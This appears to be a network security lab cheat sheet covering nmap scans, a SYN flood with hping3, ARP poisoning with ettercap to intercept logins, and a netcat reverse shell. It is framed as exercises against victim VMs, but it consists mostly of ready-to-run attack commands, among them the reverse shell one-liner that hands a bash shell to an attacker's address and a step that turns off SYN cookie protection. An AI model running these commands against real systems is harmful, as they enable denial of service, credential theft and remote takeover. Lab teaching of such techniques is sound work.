### nmap Common commands

```
nmap <ip-address or ip-range>
nmap <hostname>
nmap -p <port number or range> <ip-address>
nmap -sS <ip-address>
nmap -sT <ip-address>
nmap -sU <ip-address>
nmap -sP <ip-address>
nmap -O -v <ip-address>
nmap -sV -O -v <ip-address>
nmap -A <ip-address>
```

### SYN Flood/DoS

```
1. Start your kali VM and login.
2. Note IP address of kali VM.   
3. Start Victim1 VM.   
4. Note IP address of SEEDUbuntu1 VM.  
5. Start wire shark on SEEDUbuntu1 VM. 
6. Switch to kali VM. 
7. On command prompt type following command:
    nmap [IP of Victim1] 
8. Note open port of Victim1   
9. On command prompt type the following command
    hping3 –S [target IP Addr] –a [src IP Addr] –p [open port no.] --flood 
10. After sometime stop SYN flooding. 
11. Switch to Victim1 
12. Stop wireshark. 
13. Set filter in wireshark to IP addr of kali VM. 
14. Observe large number of SYN packets. 
15. If your attack seems unsuccessful, one thing that you can investigate is whether the SYN 
cookie mechanism is turned on. SYN cookie is a defense mechanism to counter the SYN 
flooding attack. The mechanism will kick in if the machine detects that it is under the 
SYN flooding attack. You can use the sysctl command to turn on/off the SYN cookie 
mechanism: 
a. # sysctl -a | grep cookie (Display the SYN cookie flag) 
b. # sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie) 
c. # sysctl -w net.ipv4.tcp_syncookies=1 (turn on SYN cookie)
```
### ARP Poisoning

```
1. Start and login in Kali VM, Victim1 VM and Victim2 VM. 
2. Note IP address of each VM and test connectivity using ping. 
3. Switch to Kali VM 
a. Note connected interface (eth0, eth1 or wlan0 etc.) 
b. Go to application →sniffing and spoofing → ettercap. 
c. Select unified sniffing and interface. 
d. Click host → scan for hosts. 
e. Click host → Hosts list 
f. Select Victim1 and click Add to target 1 
g. Select Victim2 and click Add to target 2 
h. Start wireshark on all three VMs
i. On ettercap, Click Mitm →ARP poisoning
TO CHECK IF IT WORKED:
4. Switch to Victim1 VM 
a. Connect to any website which requires login. 
b. Type UN and PW. 
c. telnet to Victim2 VM 
5. Switch to Kali VM and view the capture in wireshark 
```

### Netcat Reverse Shell

##### On victim machine

```
nc -e /bin/bash <attacking ip> <port>
```

Note : /bin/bash can be replaced with path to another shell

##### On attacking machine : 
```
nc -lvnp <port>
```
